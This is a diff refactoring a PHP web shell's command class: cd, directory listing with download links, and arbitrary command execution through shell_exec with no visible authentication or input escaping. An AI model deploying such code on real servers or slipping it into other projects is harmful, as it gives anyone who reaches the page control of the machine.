@@ -3,22 +3,13 @@ namespace ishibashiTokyo;
 
 class Commands
 {
-    public function Cmd_clear()
+    protected function Cmd_clear()
     {
         $_SESSION['webshell'] = [];
-
-        header("Location: " . $_SERVER['PHP_SELF']);
     }
 
-    public function Cmd_cd($cmd)
+    protected function Cmd_cd($cmd)
     {
-        $_SESSION['webshell']['history'] .= sprintf(
-            '[%s@%s %s]<br>$ %s<br>' . PHP_EOL,
-            $_SESSION['webshell']['sys_user'],
-            $_SERVER['SERVER_ADDR'],
-            $_SESSION['webshell']['path'],
-            $cmd
-        );
         $cmd_array = explode(' ', $cmd);
 
         // 引数なしの場合はカレントディレクトリをリセット
@@ -36,23 +27,14 @@ class Commands
         }
 
         $_SESSION['webshell']['path'] = realpath($_SESSION['webshell']['path'] . '/' . $cmd_array[1]);
-        header("Location: " . $_SERVER['PHP_SELF']);
-        exit();
     }
 
-    public function Cmd_ll($cmd)
+    protected function Cmd_ll($cmd)
     {
-        $_SESSION['webshell']['history'] .= sprintf(
-            '[%s@%s %s]' . PHP_EOL . '$ %s' . PHP_EOL,
-            $_SESSION['webshell']['sys_user'],
-            $_SERVER['SERVER_ADDR'],
-            $_SESSION['webshell']['path'],
-            $cmd
-        );
-
         // ls対象のディレクトリを特定
         $cmd_array = explode(' ', $cmd);
         $_path = $_SESSION['webshell']['path'];
+
         // パスの引数が存在する場合
         if (isset($cmd_array[1])) {
             // '/'始まりの場合
@@ -77,33 +59,19 @@ class Commands
             $files_pattern[] = '/\s' . $file . '/';
             $replacement[] = sprintf(
                 ' <a href="?download=%s">%s</a>',
-                $_path . '/' . $file,
+                urlencode($_path . '/' . $file),
                 $file
             );
         }
 
-        $_SESSION['webshell']['history'] .= preg_replace($files_pattern, $replacement, $_resulet);
-        header("Location: " . $_SERVER['PHP_SELF']);
-        exit();
+        return preg_replace($files_pattern, $replacement, $_resulet);
     }
 
-    public function Cmd_exec($cmd)
+    protected function Cmd_exec($cmd)
     {
-        $_SESSION['webshell']['history'] .= sprintf(
-            '[%s@%s %s]' . PHP_EOL . '$ %s' . PHP_EOL,
-            $_SESSION['webshell']['sys_user'],
-            $_SERVER['SERVER_ADDR'],
-            $_SESSION['webshell']['path'],
-            $cmd
-        );
-
         $exec_cmd = sprintf('cd %s ; %s', $_SESSION['webshell']['path'], $cmd);
         $_resulet = mb_convert_encoding(shell_exec($exec_cmd), 'UTF-8');
 
-        $_SESSION['webshell']['history']
-            .= sprintf(
-                '%s' . PHP_EOL,
-                htmlspecialchars($_resulet, ENT_QUOTES, 'UTF-8', true)
-            );
+        return htmlspecialchars($_resulet, ENT_QUOTES, 'UTF-8', true);
     }
 }
